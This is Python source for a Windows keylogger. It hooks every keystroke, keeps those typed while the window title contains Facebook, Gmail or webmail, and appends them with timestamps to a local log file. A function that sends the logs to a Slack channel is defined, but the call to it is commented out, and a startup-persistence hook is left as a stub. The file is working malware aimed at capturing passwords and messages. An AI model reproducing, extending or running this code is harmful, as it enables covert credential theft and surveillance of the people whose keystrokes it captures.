import pythoncom, pyHook
import os
import sys
import win32event, win32api, winerror, win32gui
import configparser
import time
from datetime import datetime
from slackclient import SlackClient
from winreg import *

#####################################################
#				INITIALIZATION VARIABLES			#
#####################################################

# Slack link:
config = configparser.ConfigParser()
config.read('slack.ini')
slack_channel = config['channel']['ch1']
slack_token = config['token']['tk1']
slack_client = SlackClient(slack_token)
# File info
FILE = 'logfile.log'
data = ''
max_length = 1

# Keywords for algorithm
key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']


#####################################################
#				KEYLOGGER FUNCTIONS 				#
#####################################################

def startup(func):
	"""
	todo :
	implement decorator @startup to launch keylogger when starting the computer
	"""

def on_keyboard(event):
	global data
	try:
		if is_relevant_window(event.WindowName, key_words):
			if event.Ascii == 13: # return pressed
				key_pressed = '\n'
			elif event.Ascii == 9: # tab pressed
				key_pressed = '\t'
			elif event.Ascii == 8:
				key_pressed = '[BACK]'
			else:
				# convert pressed key using Ascii look up table
				key_pressed = chr(event.Ascii)
			data += key_pressed
			if len(data) >= max_length:
				log_info = {'datum': datetime.now().__str__(), 'WindowName': event.WindowName,
						'data': data}
				log = "{d[datum]} :: {d[WindowName]} :: {d[data]} \n".format(d=log_info)
				data = ''
				log_on_file(FILE, log)
				#log_on_cloud(slack_client, slack_channel, log)
		return True
	except:
		return False

def log_on_file(file, data):
	# append the input data in the log file
	with open(file, 'a') as f:
		f.write(data)

def log_on_cloud(client, channel, data):
	client.api_call(
		"chat.postMessage",
		channel=channel,
		text=data)

#####################################################
#				ALGORITHM RELEVANT  				#
#####################################################

def is_relevant_window(WindowName, key_words):
	res = False
	upper_case_wn = WindowName.upper()
	for key_word in key_words:
		if key_word in upper_case_wn:
			res = True
	return res


#####################################################
#						MAIN						#
#####################################################

if __name__ == '__main__':
	try:
		hm = pyHook.HookManager()
		hm.SubscribeKeyDown(on_keyboard)
		hm.HookKeyboard()
		# infinite loop
		pythoncom.PumpMessages()
	except:
		hm.UnhookKeyboard()
		time.sleep(1)
		hm.HookKeyboard()

